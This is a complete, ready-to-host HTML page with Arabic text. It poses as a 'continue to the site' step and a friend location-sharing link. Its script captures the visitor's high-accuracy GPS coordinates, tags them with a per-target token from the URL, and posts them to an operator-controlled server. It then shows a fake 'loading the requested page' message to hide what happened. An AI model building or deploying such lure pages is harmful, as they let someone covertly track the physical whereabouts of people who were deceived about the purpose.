
<!-- save as share-location.html and host via HTTPS -->
<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>اكمل الى الموقع المحدد</title>
</head>
<body>
  <h3>مشاركة موقعك مع صديقك</h3>
  <p id="status">اضغط الزر للمشاركة — ستُطلب إذن تحديد الموقع من متصفحك.</p>
  <button id="shareBtn">اضغط هنا للمتابعة</button>

  <script>
    const shareBtn = document.getElementById('shareBtn');
    const status = document.getElementById('status');

    // معرّف فريد يرسله الأصدقاء لك (مثلاً: token=haithem123) تُضمّنه في الـ URL
    // مثال: https://yourdomain.com/share-location.html?token=friendToken
    const params = new URLSearchParams(location.search);
    const token = params.get('token') || 'unknown';

    shareBtn.onclick = async () => {
      if (!navigator.geolocation) {
        status.textContent = 'المتصفح لا يدعم Geolocation.';
        return;
      }

      status.textContent = 'يتم الحصول على الموقع...';
      navigator.geolocation.getCurrentPosition(async (pos) => {
        const payload = {
          token,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          timestamp: new Date().toISOString()
        };

        try {
          // عدّل الرابط إلى مسار الخادم الخاص بك
          const resp = await fetch('https://yourserver.example.com/report-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          if (resp.ok) {
            status.textContent = 'جاري التحميل الى الصفحة المطلوبة .انتضر ارجوك.';
          } else {
            status.textContent = 'فشل الإرسال: ' + (await resp.text());
          }
        } catch (err) {
          status.textContent = 'خطأ في الإرسال: ' + err.message;
        }
      }, (err) => {
        status.textContent = 'المستخدم رفض الإذن أو حدث خطأ: ' + err.message;
      }, { enableHighAccuracy: true, timeout: 10000 });
    };
  </script>
</body>
</html>
